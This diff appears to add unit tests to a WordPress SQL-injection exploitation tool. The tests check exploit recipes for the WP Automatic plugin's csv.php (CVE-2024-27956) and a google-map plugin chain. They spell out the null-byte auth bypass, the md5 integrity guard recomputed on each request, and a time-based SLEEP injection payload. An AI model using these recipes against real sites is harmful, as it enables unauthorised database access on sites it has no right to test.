@@ -75,6 +75,21 @@ def test_sqli_recipe_present_for_farm_plugin():
     assert r[0]["affected"] == "<=4.9.1"
 
 
+def test_wp_automatic_registry_recipe_wires_end_to_end():
+    # Uses the REAL registry recipe (not a synthetic dict) to catch wiring bugs
+    # between wp_recipes' field names and what _timed expects — including the
+    # integ=md5(q) companion the WP Automatic csv.php guard demands.
+    r = wp_recipes.find_sqli("wp-automatic")[0]
+    assert r["cve"] == "CVE-2024-27956"
+    assert r["endpoint"].endswith("/inc/csv.php")
+    assert r["inject_param"] == "q"
+    http = MagicMock()
+    wp_sqli._timed("http://t", http, r, "1=1", 5)
+    p = http.get.call_args.kwargs["params"]
+    assert p["integ"] == hashlib.md5(p["q"].encode()).hexdigest()
+    assert p["auth"] == "\x00"
+
+
 # ── real wp-google-map-plugin request shape (live-verified) ───────────────────
 def test_gmap_recipe_real_unauth_chain():
     r = wp_recipes.find_sqli("wp-google-map-plugin")[0]
@@ -122,3 +137,49 @@ def test_confirm_harvests_nonce_once_then_times(monkeypatch):
     out = wp_sqli.confirm("http://t", http, r, delay=5)
     assert out["confirmed"] is True
     assert seen and all(rec["data"]["nonce"] == "deadbeef01" for rec in seen)
+
+
+# ── integrity companion param: integ = md5(q) (WP Automatic CVE-2024-27956) ────
+# csv.php runs $wpdb->get_results($_REQUEST['q']) behind a guard that requires
+# integ == md5(q). Because q (the whole injected query) changes every request,
+# the engine must recompute the hash per request — not template a static value.
+import hashlib
+
+_AUTO = {
+    "method": "GET",
+    "endpoint": "/wp-content/plugins/wp-automatic/inc/csv.php",
+    "params": {"auth": "\x00"},
+    "inject_param": "q",
+    "inject_in": "params",
+    "integrity": {"param": "integ", "algo": "md5"},
+    "payload": "SELECT IF(({cond}),SLEEP({sleep}),0)",
+    "true_cond": "1=1",
+    "false_cond": "1=2",
+}
+
+
+def test_timed_computes_integrity_hash_of_injected_value():
+    http = MagicMock()
+    wp_sqli._timed("http://t/", http, _AUTO, "1=1", 5)
+    params = http.get.call_args.kwargs["params"]
+    q = params["q"]
+    assert q == "SELECT IF((1=1),SLEEP(5),0)"
+    assert params["integ"] == hashlib.md5(q.encode()).hexdigest()
+    assert params["auth"] == "\x00"          # static bypass param preserved
+
+
+def test_timed_integrity_recomputed_when_query_changes():
+    http = MagicMock()
+    wp_sqli._timed("http://t/", http, _AUTO, "1=2", 0)      # control query
+    i_control = http.get.call_args.kwargs["params"]["integ"]
+    wp_sqli._timed("http://t/", http, _AUTO, "1=1", 5)      # injected query
+    i_injected = http.get.call_args.kwargs["params"]["integ"]
+    # different q → different integ (proves it isn't a stale/static hash)
+    assert i_control != i_injected
+
+
+def test_timed_without_integrity_adds_no_companion_param():
+    # regression: recipes with no 'integrity' (e.g. gmap) must be unaffected
+    http = MagicMock()
+    wp_sqli._timed("http://t/", http, RECIPE, "1=1", 5)
+    assert "integ" not in http.get.call_args.kwargs["params"]
